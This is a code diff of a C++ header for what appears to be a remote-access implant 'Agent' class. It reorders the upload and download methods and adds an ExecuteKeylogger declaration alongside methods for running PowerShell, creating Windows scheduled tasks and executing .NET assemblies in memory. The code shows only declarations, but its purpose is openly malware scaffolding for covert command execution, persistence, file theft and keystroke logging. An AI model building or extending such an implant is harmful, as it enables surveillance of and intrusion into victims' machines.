@@ -32,10 +32,11 @@ public:
 	void Exit();
 	Response GetUID(const int &taskID, const bool &isTrue);
 	Response ExecutePowerShell(const int &taskID, const CommandPowershell &request);
-	Response UploadFile(const int &taskID, const CommandUploadFile &uploadRequest);
-	Response DownloadFile(const int &taskID, const CommandDownloadFile &downloadRequest);
 	Response CreateWindowsTaskW(const int &taskID, const CommandWinTask &request);
 	Response ExecuteNetAsm(const int &taskID, const CommandNetAsm &request);
+	Response UploadFile(const int &taskID, const CommandUploadFile &uploadRequest);
+	Response DownloadFile(const int &taskID, const CommandDownloadFile &downloadRequest);
+	Response ExecuteKeylogger(const int &taskID, const int &code);
 
 private:
 	Keylogger keylogger;
@@ -43,6 +44,5 @@ private:
 	TaskQueueManager taskManager;
 	std::string CaptureCommandOutput(const std::string &cmd);
 	HRESULT DotnetExecute(_In_ PBYTE AssemblyBytes, _In_ ULONG AssemblySize, _In_ PWSTR AppDomainName, _In_ PWSTR Arguments, _Out_ LPSTR *OutputBuffer, _Out_ PULONG OutputLength);
-	Response Agent::UploadFile(const int &taskID, const CommandUploadFile &uploadRequest)
 };
 //^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^{ END OF FILE }^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^//
